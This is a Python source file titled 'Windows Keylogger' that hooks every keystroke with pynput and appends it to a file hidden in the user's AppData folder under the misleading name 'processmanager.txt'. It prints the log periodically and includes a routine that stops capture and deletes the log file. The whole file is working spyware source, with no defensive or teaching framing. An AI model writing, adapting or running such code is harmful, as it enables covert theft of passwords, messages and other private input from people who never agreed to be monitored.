# ---- Windows Keylogger ---- #

import os
from pynput.keyboard import Listener
from re import search
import time
import threading

class Keylogger():

    keys = []
    path = os.environ['appdata'] +'\\processmanager.txt'
    flag = 0

    def onPress(self, key):
        keyCode = 96

        # Account for numpad numbers
        if (str(key).startswith("<")):
            for i in range(0, 9):
                if search(str(keyCode), str(key)):
                    self.keys.append(str(i))
                    break
                
                keyCode += 1
        else:
            self.keys.append(key)

        if len(self.keys) > 0:
            self.dump(self.keys)
            self.keys = []

    def getLog(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def dump(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' [Backspace] ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' [Shift] ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' [Caps_Lock] ')
                elif k.find('Key'):
                    f.write(k)

    # Set the threading flag to 1, stop the listener, destroy the dump file
    def deleteFile(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener   

        with Listener(on_press=self.onPress) as listener:
            listener.join()

# Enable the program to be ran as a stand-alone script 
if __name__ == '__main__':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()

    while keylog.flag != 1:

        time.sleep(10)
        logs = keylog.getLog()
        print(logs)
    
    #keylog.deleteFile()
    t.join()